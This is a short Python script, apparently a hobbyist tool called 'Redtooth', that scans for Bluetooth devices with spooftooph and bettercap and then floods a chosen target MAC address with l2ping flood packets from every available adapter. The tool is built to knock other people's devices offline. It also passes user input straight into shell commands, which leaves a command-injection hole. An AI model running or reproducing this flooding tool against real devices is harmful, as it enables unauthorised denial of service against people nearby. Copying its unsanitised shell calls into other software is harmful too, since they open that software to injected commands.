#!/usr/bin/env python3
import os
import time
import subprocess
import sys
RED = "\033[31m"
GREEN = '\033[32m'
BLUE = '\033[34m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = "\033[0m"
BRIGHT = '\033[1m'

def cprint(string):
    print(f'{CYAN}[+]{RESET}' + ' ' + f'{BLUE}{string}{RESET}')

def cinput(string):
    r = input(f'{GREEN}[>]{RESET}' + ' ' + f'{CYAN}{string}:{RESET}{BRIGHT} ')
    return r

def l2spam(adaps, target_addr="60:35:73:85:8B:A9", packages_size=600):
    try:
        for adap in adaps:
            command = f'l2ping -i hci{adap} -s {packages_size} -f {target_addr}'
            subprocess.run(command, shell=True)
    except KeyboardInterrupt:
        return

def recon():
    n = cinput("Interface for scans")
    os.system(f"sudo spooftooph -i hci{n} -s")
    n = cinput("Scan with bettercap? (y, n)")
    if n == "y":
        os.system(f"sudo bettercap")
    else:
        pass

def startooth():
    print(f"""{RED}
  _____          _ _              _   _     
 |  __ \        | | |            | | | |    
 | |__) |___  __| | |_ ___   ___ | |_| |__  
 |  _  // _ \/ _` | __/ _ \ / _ \| __| '_ \ 
 | | \ \  __/ (_| | || (_) | (_) | |_| | | |
 |_|  \_\___|\__,_|\__\___/ \___/ \__|_| |_|                                       {RESET}
    """)
    print(GREEN)
    os.system("hciconfig")
    q = cinput("Adapters quantity")

    def main():
        try:
            recon()
            mc = cinput("Attack Mac Address")
            i = 0
            l = []
            while i < int(q):
                l.append(i)
                i += 1
            l2spam(l, mc)
        except KeyboardInterrupt:
            cprint("\nGoodbye!")
            sys.exit(0)

    main()

    c = cinput("Another round or exit? (c, e)")
    if c == "c":
        main()
    else:
        sys.exit(0)